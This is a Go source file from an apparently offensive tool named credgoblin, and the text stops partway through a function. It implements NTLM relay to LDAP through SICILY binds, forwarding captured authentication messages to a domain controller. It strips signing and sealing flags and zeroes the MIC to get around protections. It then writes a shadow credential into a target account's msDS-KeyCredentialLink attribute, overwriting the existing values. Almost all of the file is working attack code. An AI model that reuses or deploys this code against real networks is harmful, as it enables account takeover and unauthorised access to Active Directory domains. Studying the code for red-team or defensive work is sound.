package relay

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/go-ldap/ldap/v3"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// LDAPClient handles LDAP connections with NTLM authentication
type LDAPClient struct {
	targetURL     string
	logger        *output.Logger
	rawConn       net.Conn
	ldapConn      *ldap.Conn // go-ldap connection wrapper
	messageID     int64
	sicilyState   int    // 0=not started, 1=discovery sent, 2=negotiate sent, 3=authenticated
	isLDAPS       bool   // true if using LDAPS (TLS)
	sessionKey    []byte // NTLM session key for LDAP signing
	sendSeqNum    uint32 // Send sequence number for signing
	recvSeqNum    uint32 // Receive sequence number for signing
	signingActive bool   // Whether LDAP signing is active
	cachedBaseDN  string // Cached baseDN queried before authentication
}

// NewLDAPClient creates a new LDAP client
func NewLDAPClient(targetURL string, logger *output.Logger) *LDAPClient {
	return &LDAPClient{
		targetURL: targetURL,
		logger:    logger,
	}
}

// GetTargetURL returns the target LDAP URL
func (c *LDAPClient) GetTargetURL() string {
	return c.targetURL
}

// IsLDAPS returns true if this connection is using LDAPS (TLS)
func (c *LDAPClient) IsLDAPS() bool {
	return c.isLDAPS
}

// Connect establishes connection to LDAP server
func (c *LDAPClient) Connect() error {
	c.logger.Debug(fmt.Sprintf("Connecting to LDAP: %s", c.targetURL))

	// Parse URL to determine if ldaps or ldap
	target := c.targetURL
	if !strings.Contains(target, "://") {
		target = "ldap://" + target
	}

	u, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("invalid LDAP URL: %w", err)
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "ldaps" {
			host += ":636"
		} else {
			host += ":389"
		}
	}

	// Create raw TCP connection for SICILY with timeout
	var rawConn net.Conn
	dialer := &net.Dialer{
		Timeout: 10 * time.Second,
	}
	if u.Scheme == "ldaps" {
		c.isLDAPS = true
		rawConn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{InsecureSkipVerify: true})
	} else {
		c.isLDAPS = false
		rawConn, err = dialer.Dial("tcp", host)
	}

	if err != nil {
		return fmt.Errorf("failed to connect to LDAP: %w", err)
	}

	// Set read/write timeouts
	rawConn.SetDeadline(time.Now().Add(30 * time.Second))

	c.rawConn = rawConn
	c.messageID = 1
	c.logger.Info("Connected to LDAP server")

	// CRITICAL: ntlmrelayx performs LDAP queries on the connection BEFORE starting SICILY
	// This is required for Windows DC - without it, the DC won't respond after SICILY auth!
	c.logger.Debug("Performing pre-SICILY queries (required for Windows DC)...")
	if err := c.preSicilyQueries(); err != nil {
		c.logger.Warning(fmt.Sprintf("Pre-SICILY queries failed: %v - continuing anyway", err))
		// Don't fail - continue with SICILY
	}

	return nil
}

// preSicilyQueries performs queries before SICILY authentication
// This is CRITICAL - Windows DC requires seeing LDAP activity before SICILY
// or it won't respond to queries after authentication succeeds
func (c *LDAPClient) preSicilyQueries() error {
	// Query 1: baseDN query (like ntlmrelayx does)
	c.logger.Debug("Pre-SICILY query: baseDN...")
	if err := c.queryBaseDNUnauthenticated(); err != nil {
		c.logger.Debug(fmt.Sprintf("BaseDN query failed (expected): %v", err))
		// This will fail with "bind required" but that's OK - we just need to send the query
	}

	return nil
}

// queryBaseDNUnauthenticated attempts unauthenticated baseDN query
func (c *LDAPClient) queryBaseDNUnauthenticated() error {
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 3, "Deref"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))
	filter := ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "objectClass", "Filter")
	searchRequest.AppendChild(filter)
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "defaultNamingContext", "Attribute"))
	searchRequest.AppendChild(attributes)
	packet.AppendChild(searchRequest)

	if err := c.sendPacket(packet); err != nil {
		return err
	}

	// Try to receive response (may be error, that's OK)
	c.rawConn.SetDeadline(time.Now().Add(2 * time.Second))
	defer c.rawConn.SetDeadline(time.Time{})

	// Read searchResEntry (or error response)
	response, err := c.receivePacket()
	if err != nil {
		return err
	}

	c.logger.Debug(fmt.Sprintf("Received pre-SICILY searchResEntry (%d children)", len(response.Children)))

	// Read searchResDone - CRITICAL: DC sends TWO packets per search!
	searchDone, err := c.receivePacket()
	if err != nil {
		return err
	}

	c.logger.Debug(fmt.Sprintf("Received pre-SICILY searchResDone (%d children)", len(searchDone.Children)))
	return nil
}

// queryRootDSE performs an anonymous RootDSE query to initialize the connection
func (c *LDAPClient) queryRootDSE() error {
	c.logger.Debug("Querying RootDSE to initialize connection...")

	// Build search request for RootDSE (empty base DN, base scope)
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 2, "Scope (wholeSubtree)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 3, "Deref Aliases (derefAlways)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

	// Filter: (objectClass=*) - Present filter must be PRIMITIVE not CONSTRUCTED
	filter := ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "objectClass", "Present Filter")
	searchRequest.AppendChild(filter)

	// Attributes: supportedSASLMechanisms only (defaultNamingContext requires auth)
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedSASLMechanisms", "Attribute"))
	searchRequest.AppendChild(attributes)

	packet.AppendChild(searchRequest)

	// Send the packet
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send RootDSE query: %w", err)
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive RootDSE response: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("RootDSE query completed (%d bytes)", len(response.Bytes())))

	// Parse and cache the defaultNamingContext if present
	// LDAP search responses can have: MessageID, SearchResultEntry (tag 4), SearchResultDone (tag 5)
	// OR just: MessageID, SearchResultDone (tag 5) with attributes embedded
	c.logger.Debug(fmt.Sprintf("Parsing RootDSE response: %d children", len(response.Children)))

	// Find SearchResultEntry (tag 4) - iterate through all children
	for i, child := range response.Children {
		c.logger.Debug(fmt.Sprintf("Child %d: tag=%d, children=%d", i, child.Tag, len(child.Children)))

		if child.Tag == 4 && len(child.Children) >= 2 {
			// SearchResultEntry found
			attrs := child.Children[1]
			c.logger.Debug(fmt.Sprintf("Found SearchResultEntry, Attributes: tag=%d, children=%d", attrs.Tag, len(attrs.Children)))

			if attrs.Tag == ber.TagSequence {
				for j, attr := range attrs.Children {
					if len(attr.Children) >= 2 {
						attrName, ok := attr.Children[0].Value.(string)
						c.logger.Debug(fmt.Sprintf("Attribute %d name: %v (ok=%v)", j, attrName, ok))

						if ok && attrName == "defaultNamingContext" {
							valueSet := attr.Children[1]
							if len(valueSet.Children) >= 1 {
								if baseDN, ok := valueSet.Children[0].Value.(string); ok {
									c.cachedBaseDN = baseDN
									c.logger.Debug(fmt.Sprintf("Cached base DN from RootDSE: %s", baseDN))
									break
								}
							}
						}
					}
				}
			}
			break
		}
	}

	return nil
}

// QueryBaseDNBeforeAuth queries for defaultNamingContext using a separate temporary connection
// This avoids contaminating the main connection that will be used for SICILY authentication
// Windows LDAP servers are sensitive to the query sequence before SICILY bind
func (c *LDAPClient) QueryBaseDNBeforeAuth() error {
	c.logger.Debug("Querying defaultNamingContext via separate connection...")

	// Parse target URL to get host:port
	target := c.targetURL
	if !strings.Contains(target, "://") {
		target = "ldap://" + target
	}

	parsedURL, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("failed to parse URL: %w", err)
	}

	address := parsedURL.Host
	if !strings.Contains(address, ":") {
		if parsedURL.Scheme == "ldaps" {
			address += ":636"
		} else {
			address += ":389"
		}
	}

	// Open a temporary connection for the baseDN query
	var tempConn net.Conn
	if parsedURL.Scheme == "ldaps" {
		tempConn, err = tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", address, &tls.Config{InsecureSkipVerify: true})
	} else {
		tempConn, err = net.DialTimeout("tcp", address, 10*time.Second)
	}
	if err != nil {
		return fmt.Errorf("failed to open temp connection: %w", err)
	}
	defer tempConn.Close()

	// Build search request for RootDSE (message ID 1 on this new connection)
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 1, "MessageID"))

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope (base)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Deref Aliases"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 10, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

	// Filter: (objectClass=*)
	filter := ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "objectClass", "Present Filter")
	searchRequest.AppendChild(filter)

	// Attributes: defaultNamingContext
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "defaultNamingContext", "Attribute"))
	searchRequest.AppendChild(attributes)

	packet.AppendChild(searchRequest)

	// Send the packet on temp connection
	packetBytes := packet.Bytes()
	if _, err := tempConn.Write(packetBytes); err != nil {
		return fmt.Errorf("failed to send baseDN query: %w", err)
	}

	// Receive response on temp connection
	tempConn.SetReadDeadline(time.Now().Add(10 * time.Second))

	// Read packet header (tag byte)
	tagByte := make([]byte, 1)
	if _, err := io.ReadFull(tempConn, tagByte); err != nil {
		return fmt.Errorf("failed to read tag byte: %w", err)
	}

	// Read length byte(s)
	lengthByte := make([]byte, 1)
	if _, err := io.ReadFull(tempConn, lengthByte); err != nil {
		return fmt.Errorf("failed to read length byte: %w", err)
	}

	var lengthBytes []byte
	var length int

	if lengthByte[0]&0x80 == 0 {
		// Short form
		length = int(lengthByte[0])
		lengthBytes = lengthByte
	} else {
		// Long form
		numOctets := int(lengthByte[0] & 0x7f)
		lengthOctets := make([]byte, numOctets)
		if _, err := io.ReadFull(tempConn, lengthOctets); err != nil {
			return fmt.Errorf("failed to read length octets: %w", err)
		}
		for _, b := range lengthOctets {
			length = (length << 8) | int(b)
		}
		lengthBytes = append(lengthByte, lengthOctets...)
	}

	// Read packet body
	body := make([]byte, length)
	if _, err := io.ReadFull(tempConn, body); err != nil {
		return fmt.Errorf("failed to read response body: %w", err)
	}

	// Reconstruct full packet bytes for BER decoding
	fullPacket := append(tagByte, lengthBytes...)
	fullPacket = append(fullPacket, body...)

	// Parse response
	response := ber.DecodePacket(fullPacket)
	if response == nil {
		return fmt.Errorf("failed to decode BER packet")
	}

	c.logger.Debug(fmt.Sprintf("BaseDN query response (%d bytes, %d children)", len(response.Bytes()), len(response.Children)))

	// Parse defaultNamingContext from response
	for i, child := range response.Children {
		c.logger.Debug(fmt.Sprintf("Child %d: tag=%d, children=%d", i, child.Tag, len(child.Children)))

		if child.Tag == 4 && len(child.Children) >= 2 {
			// SearchResultEntry found
			attrs := child.Children[1]
			if attrs.Tag == ber.TagSequence {
				for _, attr := range attrs.Children {
					if len(attr.Children) >= 2 {
						attrName, ok := attr.Children[0].Value.(string)
						if ok && attrName == "defaultNamingContext" {
							valueSet := attr.Children[1]
							if len(valueSet.Children) >= 1 {
								if baseDN, ok := valueSet.Children[0].Value.(string); ok {
									c.cachedBaseDN = baseDN
									c.logger.Info(fmt.Sprintf("Cached base DN before SICILY: %s", baseDN))
									return nil
								}
							}
						}
					}
				}
			}
		}
	}

	return fmt.Errorf("defaultNamingContext not found in response")
}

// queryRootDSEAfterSICILY does a simple rootDSE query on the authenticated connection
// This "activates" the connection for normal LDAP operations after SICILY authentication
func (c *LDAPClient) queryRootDSEAfterSICILY() error {
	if c.rawConn == nil {
		return fmt.Errorf("not connected")
	}

	// Build a simple rootDSE query (base="", scope=base, filter=(objectClass=*))
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	searchRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 3, nil, "Search Request")
	searchRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope (base)"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 3, "Deref Aliases"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	searchRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Time Limit"))
	searchRequest.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

	// Filter: (objectClass=*)
	filter := ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "objectClass", "Present Filter")
	searchRequest.AppendChild(filter)

	// Attributes: request same attributes as ntlmrelayx for maximum compatibility
	attributes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "altServer", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "namingContexts", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedControl", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedExtension", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedFeatures", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedCapabilities", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedLdapVersion", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "supportedSASLMechanisms", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "vendorName", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "vendorVersion", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "subschemaSubentry", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "*", "Attribute"))
	attributes.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "+", "Attribute"))
	searchRequest.AppendChild(attributes)

	packet.AppendChild(searchRequest)

	// Send the request
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send rootDSE query: %w", err)
	}

	// Receive responses with short timeout
	c.rawConn.SetDeadline(time.Now().Add(2 * time.Second))
	defer c.rawConn.SetDeadline(time.Time{}) // Clear deadline

	// Read searchResEntry
	response1, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive rootDSE searchResEntry: %w", err)
	}
	c.logger.Debug(fmt.Sprintf("RootDSE searchResEntry received (%d children)", len(response1.Children)))

	// Read searchResDone
	response2, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive rootDSE searchResDone: %w", err)
	}
	c.logger.Debug(fmt.Sprintf("RootDSE searchResDone received (%d children)", len(response2.Children)))

	return nil
}

// ForwardNegotiate forwards NTLM Type 1 message to LDAP using SICILY protocol
func (c *LDAPClient) ForwardNegotiate(type1 []byte) ([]byte, error) {
	c.logger.Info("Forwarding NTLM Type 1 to LDAP via SICILY...")

	// Strip Sign/Seal flags to prevent LDAP signing requirement
	modifiedType1, err := c.stripSignSealFlags(type1)
	if err != nil {
		return nil, fmt.Errorf("failed to strip flags: %w", err)
	}
	c.logger.Debug(fmt.Sprintf("Forwarding Type 1 (%d bytes)", len(modifiedType1)))

	// First, perform SICILY package discovery
	c.logger.Debug("Performing SICILY package discovery...")
	if err := c.sicilyDiscovery(); err != nil {
		return nil, fmt.Errorf("SICILY discovery failed: %w", err)
	}

	// Send Type 1 via SICILY negotiate
	c.logger.Debug("Sending SICILY negotiate with NTLM Type 1...")
	if err := c.sicilyNegotiate(modifiedType1); err != nil {
		return nil, fmt.Errorf("SICILY negotiate failed: %w", err)
	}

	// Receive NTLM Type 2 challenge
	c.logger.Debug("Receiving SICILY challenge...")
	type2, err := c.sicilyReceiveChallenge()
	if err != nil {
		return nil, fmt.Errorf("failed to receive SICILY challenge: %w", err)
	}

	c.logger.Info(fmt.Sprintf("Received NTLM Type 2 challenge (%d bytes)", len(type2)))

	return type2, nil
}

// ForwardAuthenticate forwards NTLM Type 3 message to LDAP
func (c *LDAPClient) ForwardAuthenticate(type3 []byte) error {
	c.logger.Info("Forwarding NTLM Type 3 to LDAP via SICILY...")

	// Forward Type 3 unmodified
	c.logger.Debug(fmt.Sprintf("Forwarding Type 3 (%d bytes)", len(type3)))

	// Send Type 3 via SICILY response
	c.logger.Debug("Sending SICILY response with Type 3...")
	if err := c.sicilyAuthenticate(type3); err != nil {
		return fmt.Errorf("SICILY authenticate failed: %w", err)
	}

	// Receive final bind response
	c.logger.Debug("Receiving bind response...")
	if err := c.sicilyReceiveBindResponse(); err != nil {
		return err
	}

	c.logger.Info("LDAP authentication successful!")

	// Reset connection deadline to keep connection alive for subsequent operations
	// ntlmrelayx doesn't set aggressive deadlines, so we shouldn't either
	if c.rawConn != nil {
		c.rawConn.SetDeadline(time.Time{}) // Clear deadline (no timeout)
	}

	c.logger.Info("SICILY authentication complete")

	// Skip RootDSE query - it times out and closes the connection
	// The authentication is already successful and the connection is usable
	c.logger.Debug("Skipping RootDSE query - connection is ready")

	return nil
}

// stripSignSealFlags removes Sign/Seal/KeyExch flags from NTLM messages
// This prevents LDAP response wrapping but keeps MIC intact
// Works for both Type 1 (flags at offset 12) and Type 3 (flags at offset 60)
func (c *LDAPClient) stripSignSealFlags(msg []byte) ([]byte, error) {
	// Clone the message
	modified := make([]byte, len(msg))
	copy(modified, msg)

	// Determine message type and flag offset
	var flagOffset int
	var msgType uint32
	if len(msg) >= 12 {
		msgType = binary.LittleEndian.Uint32(msg[8:12])
		if msgType == 1 { // Type 1
			flagOffset = 12
			if len(msg) < 16 {
				return nil, fmt.Errorf("type 1 message too short")
			}
		} else if msgType == 3 { // Type 3
			flagOffset = 60
			if len(msg) < 64 {
				return nil, fmt.Errorf("type 3 message too short")
			}
		} else {
			return nil, fmt.Errorf("unknown message type: %d", msgType)
		}
	} else {
		return nil, fmt.Errorf("message too short")
	}

	// Read flags
	flags := binary.LittleEndian.Uint32(modified[flagOffset : flagOffset+4])
	c.logger.Debug(fmt.Sprintf("Original flags: 0x%08x", flags))

	// Strip: Sign, Seal, KeyExchange (like ntlmrelayx without --remove-mic)
	// NegotiateSign = 0x00000010
	// NegotiateSeal = 0x00000020
	// NegotiateKeyExchange = 0x40000000
	flags &^= 0x00000010 // Sign
	flags &^= 0x00000020 // Seal
	flags &^= 0x40000000 // KeyExchange

	c.logger.Debug(fmt.Sprintf("Stripped flags: 0x%08x", flags))

	// Write modified flags back
	binary.LittleEndian.PutUint32(modified[flagOffset:flagOffset+4], flags)

	// Zero MIC in Type 3 since we modified the flags
	// MIC is calculated over Type1+Type2+Type3, so modifying Type1 or Type3 invalidates it
	// Only Type 3 has MIC (at offset 72-87)
	if msgType == 3 && len(modified) >= 88 {
		c.logger.Debug("Zeroing MIC at offset 72-87")
		for i := 72; i < 88; i++ {
			modified[i] = 0
		}
	}

	return modified, nil
}

// stripSigningFlags removes signing/sealing flags from NTLM Type 3 message
// This prevents the DC from wrapping/sealing LDAP responses after SICILY auth
func (c *LDAPClient) stripSigningFlags(type3 []byte) ([]byte, error) {
	if len(type3) < 64 {
		return nil, fmt.Errorf("type 3 message too short: %d bytes", len(type3))
	}

	// Clone the message so we don't modify the original
	modified := make([]byte, len(type3))
	copy(modified, type3)

	// Negotiate flags are at offset 60-63 (little endian uint32)
	flags := binary.LittleEndian.Uint32(modified[60:64])

	c.logger.Debug(fmt.Sprintf("Original flags: 0x%08x", flags))

	// Strip signing/sealing flags (like ntlmrelayx does)
	// We strip: Sign, Seal, LM_KEY, KeyExchange, and Anonymous
	// We KEEP: AlwaysSign (ntlmrelayx keeps this!)
	// NegotiateSign = 0x00000010
	// NegotiateSeal = 0x00000020
	// NegotiateLmKey = 0x00000080
	// NegotiateAnonymous = 0x00000800
	// NegotiateKeyExchange = 0x40000000
	flags &^= 0x00000010 // NegotiateSign
	flags &^= 0x00000020 // NegotiateSeal
	flags &^= 0x00000080 // NegotiateLmKey (ntlmrelayx strips this!)
	flags &^= 0x00000800 // NegotiateAnonymous (critical - DC treats this as anonymous bind!)
	flags &^= 0x40000000 // NegotiateKeyExchange

	c.logger.Debug(fmt.Sprintf("Stripped flags: 0x%08x", flags))

	// Write modified flags back
	binary.LittleEndian.PutUint32(modified[60:64], flags)

	// CRITICAL: Zero out the MIC since we modified Type 3 but not Type 1!
	// The client calculated MIC over original Type 1, but we're sending modified Type 3
	// Zeroing MIC makes DC ignore it
	if len(modified) >= 88 {
		c.logger.Debug("Zeroing MIC at offset 72-87")
		for i := 72; i < 88; i++ {
			modified[i] = 0
		}
	}

	return modified, nil
}

// stripSigningFlagsType1 removes signing/sealing flags from NTLM Type 1 message
// This must match the flags we strip from Type 3 so the MIC remains valid
func (c *LDAPClient) stripSigningFlagsType1(type1 []byte) ([]byte, error) {
	if len(type1) < 32 {
		return nil, fmt.Errorf("type 1 message too short: %d bytes", len(type1))
	}

	// Clone the message
	modified := make([]byte, len(type1))
	copy(modified, type1)

	// NTLM Type 1 structure:
	// 0-7: Signature "NTLMSSP\0"
	// 8-11: Message Type (0x01000000)
	// 12-15: Negotiate Flags (little endian uint32)
	// 16+: Optional fields (domain, workstation)

	flags := binary.LittleEndian.Uint32(modified[12:16])
	c.logger.Debug(fmt.Sprintf("Type 1 original flags: 0x%08x", flags))

	// Strip the SAME flags we strip from Type 3
	flags &^= 0x00000010 // NegotiateSign
	flags &^= 0x00000020 // NegotiateSeal
	flags &^= 0x00000080 // NegotiateLmKey (CRITICAL - ntlmrelayx strips this!)
	flags &^= 0x00000800 // NegotiateAnonymous
	flags &^= 0x40000000 // NegotiateKeyExchange

	c.logger.Debug(fmt.Sprintf("Type 1 stripped flags: 0x%08x", flags))

	binary.LittleEndian.PutUint32(modified[12:16], flags)

	// Verify the modification actually happened
	verifyFlags := binary.LittleEndian.Uint32(modified[12:16])
	if verifyFlags != flags {
		return nil, fmt.Errorf("Type 1 flag modification failed: wrote 0x%08x but read back 0x%08x", flags, verifyFlags)
	}
	c.logger.Debug(fmt.Sprintf("Type 1 flags verified: 0x%08x", verifyFlags))

	return modified, nil
}

// ModifyKeyCredential adds shadow credentials to target user
func (c *LDAPClient) ModifyKeyCredential(userDN string, keyCredential []byte) error {
	c.logger.Debug(fmt.Sprintf("Adding KeyCredential to %s", userDN))

	if c.rawConn == nil {
		return fmt.Errorf("not connected to LDAP")
	}

	// Query existing values first (like ntlmrelayx does)
	c.logger.Debug("Searching for existing msDS-KeyCredentialLink values...")
	existingValues, err := c.searchKeyCredentialLink(userDN)
	if err != nil {
		c.logger.Debug(fmt.Sprintf("Search failed: %v - assuming no existing values", err))
		existingValues = [][]byte{}
	}

	// Replace with only the new KeyCredential (don't preserve existing ones)
	// This matches ntlmrelayx behavior and avoids potential multi-value issues
	// Convert binary blob to LDAP DNWithBinary format: "B:<hex_length>:<hex_data>:<dn>"
	// The length is the number of hex characters, not binary bytes (binary_bytes * 2)
	hexData := fmt.Sprintf("%X", keyCredential)
	keyCredStr := fmt.Sprintf("B:%d:%s:%s", len(hexData), hexData, userDN)
	allValues := []string{keyCredStr}
	c.logger.Debug(fmt.Sprintf("Will replace with 1 new value (discarding %d existing)", len(existingValues)))

	c.logger.Debug(fmt.Sprintf("Using authenticated connection, next message ID: %d", c.messageID))

	// Build LDAP modify request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	modifyRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 6, nil, "Modify Request")
	modifyRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, userDN, "DN"))

	changes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Changes")

	change := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Change")
	// Use REPLACE (2) not ADD (0) - matches ntlmrelayx behavior
	change.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 2, "Operation (replace)"))

	modification := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Modification")
	modification.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "msDS-KeyCredentialLink", "Attribute"))

	// Add all values (existing + new)
	values := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSet, nil, "Values")
	for _, val := range allValues {
		values.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, val, "Value"))
	}

	modification.AppendChild(values)
	change.AppendChild(modification)
	changes.AppendChild(change)
	modifyRequest.AppendChild(changes)
	packet.AppendChild(modifyRequest)

	// Send modify request
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send modify request: %w", err)
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive modify response: %w", err)
	}

	// Check result code
	if len(response.Children) < 2 {
		if len(response.Children) >= 1 && response.Children[0].Tag == 78 {
			return fmt.Errorf("LDAP server sent Notice of Disconnection")
		}
		return fmt.Errorf("invalid modify response structure")
	}

	modifyResponse := response.Children[1]
	if modifyResponse.Tag != 7 {
		return fmt.Errorf("expected ModifyResponse (tag 7), got tag %d", modifyResponse.Tag)
	}

	if len(modifyResponse.Children) < 1 {
		return fmt.Errorf("no result code in modify response")
	}

	resultCode := modifyResponse.Children[0]
	code, ok := resultCode.Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if code != 0 {
		errMsg := "unknown error"
		if len(modifyResponse.Children) >= 3 {
			if msg, ok := modifyResponse.Children[2].Value.(string); ok {
				errMsg = msg
			}
		}
